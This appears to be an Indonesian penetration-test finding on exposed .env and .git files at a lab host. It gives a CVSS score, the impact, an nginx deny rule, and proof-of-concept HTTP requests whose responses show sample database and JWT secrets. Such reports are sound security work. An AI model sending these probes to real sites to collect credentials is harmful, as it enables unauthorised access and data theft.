# Finding 06: Credential Management & Sensitive File Exposure

| Item | Detail |
|------|--------|
| **Kerentanan** | Credential Management & Sensitive File Exposure |
| **Severity** | High |
| **Skor CVSS** | 7.5 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`) |
| **Endpoint / Path** | `GET /.env`, `GET /config.json`, `GET /.git/` |

---

## Deskripsi

Kerentanan ini terjadi ketika berkas konfigurasi sensitif, repositori kode sumber, atau file cadangan (*backup*) dapat diakses secara publik langsung melalui browser tanpa memerlukan autentikasi. Selain itu, manajemen kredensial yang lemah seperti penggunaan kata sandi default atau penyimpan kredensial dalam teks terbuka (*plain text*) memungkinkan pihak tidak berwenang memperoleh akses tingkat tinggi ke sistem.

---

## Dampak

- **Kebocoran Informasi Sensitif:** Penyerang dapat memperoleh kunci rahasia aplikasi (*API Keys*, *JWT Secrets*, kata sandi database).
- **Pengambilalihan Sistem (Full System Compromise):** Kredensial database atau layanan pihak ketiga yang bocor dapat dimanfaatkan untuk mengambil alih infrastruktur secara penuh.
- **Exposure Repositori:** Akses ke folder `.git` memungkinkan penyerang mengunduh seluruh kode sumber aplikasi (*source code leakage*).

---

## Rekomendasi Perbaikan

- **Blokir Akses ke Berkas Sensitif:** Konfigurasikan web server (Nginx/Apache) untuk menolak seluruh permintaan ke berkas dotfiles (`.env`, `.git`, `.htaccess`).
- **Hapus Default Credential:** Ganti seluruh kata sandi bawaan pabrik/sistem dengan kata sandi yang kuat dan acak.
- **Gunakan Environment Variables Secure Manager:** Simpan kredensial menggunakan *secret manager* yang aman dan pastikan berkas `.env` atau *backup* diletakkan di luar direktori publik (`webroot`).

### Contoh Konfigurasi Server (Nginx)

```nginx
# Blokir akses ke file dotfiles (.env, .git, dll)
location ~ /\. {
    deny all;
    return 404;
}
```

## Langkah Proof of Concept (PoC)

### Langkah 1 — Melakukan permintaan langsung ke berkas `.env`

**Request:**

```http
GET /.env HTTP/1.1
Host: teknobantu.lab
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/plain

DB_HOST=localhost
DB_USER=root
DB_PASS=P@ssw0rd2025!
JWT_SECRET=supersecretkey123
```

> **Capture 1:** Response pembacaan berkas rahasia `.env` tanpa autentikasi

---

### Langkah 2 — Memeriksa keberadaan direktori `.git`

**Request:**

```http
GET /.git/HEAD HTTP/1.1
Host: teknobantu.lab
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/plain

ref: refs/heads/main
```

> **Capture 2:** Akses terbuka ke struktur repositori `.git/HEAD`
